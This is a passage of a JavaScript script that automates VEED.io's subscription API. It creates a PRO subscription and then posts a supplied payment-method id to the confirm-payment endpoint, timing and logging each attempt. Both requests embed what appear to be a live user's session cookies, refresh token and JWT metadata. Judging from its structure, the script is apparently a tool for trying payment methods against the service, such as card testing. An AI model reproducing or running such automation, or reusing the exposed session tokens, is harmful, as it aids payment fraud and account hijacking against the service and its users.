            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "billingaccountid": "4118e674-bfde-4b7d-b599-4465b452e9bc",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "cookie": `VEED_LOCALE=en; GCLB=CLv4oNyw_4XxVBAD; intercom-id-j76wdp4u=2898e3f0-fac3-4927-afa4-125412156d4e; intercom-device-id-j76wdp4u=17a5cd15-62b3-402a-b7bd-40be9d1ea53f; __stripe_mid=2a5d10ff-3716-4f11-89b8-4846e043468a78c3ee; www_veed_io_refresh_token=O3QRSyjS7tnxk6pvEhwKLhIEY1nkV1Yf; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22c%22%3A1725959855581%2C%22l%22%3A1725959855590%7D; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bb59b159-7a0a-28ff-f4d4-786bc2445299%22%2C%22c%22%3A1725959855596%2C%22l%22%3A1725959855596%7D; ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog=%7B%22distinct_id%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22%24sesid%22%3A%5B1725960108870%2C%220191db34-34d5-7fda-9d7a-23f624ed5303%22%2C1725959517397%5D%7D; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bcae32a0-e374-8409-a973-21edbedce1e9%22%2C%22e%22%3A1725961910529%2C%22c%22%3A1725959855587%2C%22l%22%3A1725960110529%7D; intercom-session-j76wdp4u=Wko1YlBtQW9tSzUyVWhYU3FOVnVTYkYyNmlkNEUrQzZvWkV6Qjl6bjByWGZjOHoyOU40djdBOVhBWUM3QzJrOS0tUWlSSTMvbUwwbThCL25wc1Y3R3hWQT09--2f848a11c1612661ee84320cdff72cc6932078a8; www_veed_io_user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMWQwODc4Mi1mY2YyLTRkZTYtOTNlOS0xZTdlNjFiMGRmYzAlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJlMjM2M2NmNi0xM2Y1LTRhMmEtYjBkNi1jOTlkNjc5M2YxOGYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzI1OTU5NTE3MzU1JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNTk2MzYxMTU2OCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTEwJTdE; user_meta=eyJleHAiOjE3MjU5NjQ5NDAsImlhdCI6MTcyNTk2NDA0MCwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; ${cookie}`,
            "Referer": "https://www.veed.io/",
            "Referrer-Policy": "strict-origin"
        },
        "body": "{\"cadence\":\"ANNUALLY\",\"plan\":\"PRO\",\"quantity\":1,\"planPriceId\":\"d26164e6-e27d-4883-83c0-8dd67aae28b0\",\"currency\":\"INR\",\"metadata\":{\"impact_click_id\":\"\"}}",
        "method": "POST"
    });

    const subscription_route_json = await subscription_route.json()

    const subscription_route_id = subscription_route_json.data.id

    console.log(` ✔ fetch id : ${subscription_route_id}\n`);

    try {
        const response = await fetch(`https://www.veed.io/api/v1/subscriptions/${subscription_route_id}/confirm-payment`, {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "cookie": `VEED_LOCALE=en; GCLB=CLv4oNyw_4XxVBAD; intercom-id-j76wdp4u=2898e3f0-fac3-4927-afa4-125412156d4e; intercom-device-id-j76wdp4u=17a5cd15-62b3-402a-b7bd-40be9d1ea53f; __stripe_mid=2a5d10ff-3716-4f11-89b8-4846e043468a78c3ee; www_veed_io_refresh_token=O3QRSyjS7tnxk6pvEhwKLhIEY1nkV1Yf; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22c%22%3A1725959855581%2C%22l%22%3A1725959855590%7D; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bb59b159-7a0a-28ff-f4d4-786bc2445299%22%2C%22c%22%3A1725959855596%2C%22l%22%3A1725959855596%7D; ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog=%7B%22distinct_id%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22%24sesid%22%3A%5B1725960108870%2C%220191db34-34d5-7fda-9d7a-23f624ed5303%22%2C1725959517397%5D%7D; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bcae32a0-e374-8409-a973-21edbedce1e9%22%2C%22e%22%3A1725961910529%2C%22c%22%3A1725959855587%2C%22l%22%3A1725960110529%7D; intercom-session-j76wdp4u=Wko1YlBtQW9tSzUyVWhYU3FOVnVTYkYyNmlkNEUrQzZvWkV6Qjl6bjByWGZjOHoyOU40djdBOVhBWUM3QzJrOS0tUWlSSTMvbUwwbThCL25wc1Y3R3hWQT09--2f848a11c1612661ee84320cdff72cc6932078a8; www_veed_io_user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMWQwODc4Mi1mY2YyLTRkZTYtOTNlOS0xZTdlNjFiMGRmYzAlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJlMjM2M2NmNi0xM2Y1LTRhMmEtYjBkNi1jOTlkNjc5M2YxOGYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzI1OTU5NTE3MzU1JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNTk2MzYxMTU2OCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTEwJTdE; user_meta=eyJleHAiOjE3MjU5NjQ5NDAsImlhdCI6MTcyNTk2NDA0MCwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; ${cookie}`,
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "Referer": "https://www.veed.io/",
                "Referrer-Policy": "strict-origin"
            },
            "body": JSON.stringify({ "processorPaymentMethodId": pm }),
            "method": "POST"
        });

        const response_json = await response.json()

        console.log(response_json)

        const endTime = performance.now(); // Record end time
        const timeTaken = (endTime - startTime) / 1000; // Time in seconds
        const truncatedTime = Math.floor(timeTaken * 100) / 100;

        console.log(`\n\n ✔  time takes ${truncatedTime}s `)

        console.log(`\n-------------------------------------------------`)

        return response_json
    } catch (error) {
        return error
    }
}

export function getCurrentTime() {
    return new Date();
}

export function getTimeDifference(time1, time2) {
    const diffInMs = Math.abs(time2 - time1); // Difference in milliseconds

    const diffInSeconds = Math.floor(diffInMs / 1000);
    const hours = Math.floor(diffInSeconds / 3600);
    const minutes = Math.floor((diffInSeconds % 3600) / 60);
    const seconds = diffInSeconds % 60;

    return {
        hours: hours,
        minutes: minutes,
        seconds: seconds
    };
}